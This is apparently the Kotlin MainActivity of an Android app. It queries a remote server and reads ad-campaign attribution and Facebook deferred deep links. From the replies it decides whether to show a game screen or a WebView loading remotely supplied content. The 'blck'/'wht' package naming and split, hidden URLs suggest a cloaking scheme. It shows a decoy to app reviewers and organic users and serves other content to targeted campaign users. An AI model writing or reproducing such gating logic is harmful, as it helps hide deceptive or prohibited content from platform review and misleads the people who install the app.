package com.tiramisu.driftm.blck

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.tiramisu.driftm.AppS
import com.tiramisu.driftm.AppS.Companion.AF_DEV_KEY
import com.tiramisu.driftm.AppS.Companion.C1
import com.tiramisu.driftm.AppS.Companion.D1
import com.tiramisu.driftm.AppS.Companion.linkAppsCheckPart1
import com.tiramisu.driftm.AppS.Companion.linkAppsCheckPart2
import com.tiramisu.driftm.AppS.Companion.linkFilterPart1
import com.tiramisu.driftm.AppS.Companion.linkFilterPart2
import com.tiramisu.driftm.AppS.Companion.odone
import com.tiramisu.driftm.databinding.ActivityMainBinding
import com.tiramisu.driftm.wht.Gams
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {
    private lateinit var bindMain: ActivityMainBinding

    var checker: Boolean = false
    lateinit var jsoup: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindMain = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMain.root)
        jsoup = ""

        val prefs = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
        if (prefs.getBoolean("activity_exec", false)) {
            GlobalScope.launch {
                mover()
            }
            finish()
        } else {
            val exec = prefs.edit()
            exec.putBoolean("activity_exec", true)
            exec.apply()
            val job = GlobalScope.launch(Dispatchers.IO) {
                checker = getCheckCode(linkAppsCheckPart1+linkAppsCheckPart2)
                Log.d("CHECKAPPS", "I did something")
            }
            runBlocking {
                try {
                    job.join()
                } catch (_: Exception){
                }
            }

            if (checker){
                AppsFlyerLib.getInstance()
                    .init(AF_DEV_KEY, conversionDataListener, applicationContext)
                AppsFlyerLib.getInstance().start(this)
                afNullRecordedOrNotChecker(1500)

            } else {
                GlobalScope.launch(Dispatchers.IO) {
                    mover()
                }
            }
        }
        deePP(this)




    }



    private suspend fun getCheckCode(link: String): Boolean {
        val url = URL(link)
        val urlConnection = withContext(Dispatchers.IO) {
            url.openConnection()
        } as HttpURLConnection

        return try {
            val text = urlConnection.inputStream.bufferedReader().readText()
            if (text == "1") {
                Log.d("jsoup status", text)
                true
            } else {
                Log.d("jsoup status", "is null")
                false
            }
        } finally {
            urlConnection.disconnect()
        }

    }

    private fun afNullRecordedOrNotChecker(timeInterval: Long): Job {

        val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
        return CoroutineScope(Dispatchers.IO).launch {
            while (NonCancellable.isActive) {
                val hawk1: String? = sharPref.getString(C1, null)
                if (hawk1 != null) {
                    Log.d("TestInUIHawk", hawk1.toString())
                    mover()
                    break
                } else {
                    val hawk1: String? = sharPref.getString(C1, null)
                    Log.d("TestInUIHawkNulled", hawk1.toString())
                    delay(timeInterval)
                }
            }
        }
    }



    val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
            val editor = sharPref.edit()

            val dataGotten = data?.get("campaign").toString()
            editor.putString(C1, dataGotten)
            editor.apply()
        }

        override fun onConversionDataFail(p0: String?) {

        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }


    fun deePP(context: Context) {
        val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
        val editor = sharPref.edit()
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val params = appLinkData.targetUri.host

                editor.putString(D1, params.toString())
                editor.apply()
            }
            if (appLinkData == null) {

            }
        }
    }


    private fun getCodeFromUrl(link: String) {
        val url = URL(link)
        val urlConnection = url.openConnection() as HttpURLConnection

        try {
            val text = urlConnection.inputStream.bufferedReader().readText()
            if (text.isNotEmpty()) {
                jsoup = text
            }
        } catch (ex: Exception) {

        } finally {
            urlConnection.disconnect()
        }
    }
    private suspend fun coroutineTask(): String {
        val sharedPref = getSharedPreferences("SP", MODE_PRIVATE)

        val nameParameter: String? = sharedPref.getString(C1, null)
        val appLinkParameter: String? = sharedPref.getString(D1, null)


        val taskName = "$linkFilterPart1$linkFilterPart2$odone$nameParameter"
        val taskLink = "$linkFilterPart1$linkFilterPart2$odone$appLinkParameter"

        withContext(Dispatchers.IO) {
            //changed logical null to string null
            if (nameParameter != "null") {
                getCodeFromUrl(taskName)
                Log.d("Check1C", taskName)
            } else {
                getCodeFromUrl(taskLink)
                Log.d("Check1C", taskLink)
            }
        }
        return jsoup
    }

    private suspend fun mover(){
        val job = GlobalScope.launch(Dispatchers.IO) {
            jsoup = coroutineTask()
            Log.d("jsoup status from global scope", jsoup)
        }

                job.join()
                Log.d("jsoup status out of global scope", jsoup)

                if (jsoup == AppS.jsoupCheck) {
                    Intent(applicationContext, Gams::class.java).also { startActivity(it) }
                } else {
                    Intent(applicationContext, Webb::class.java).also { startActivity(it) }
                }
                finish()
            }

    }
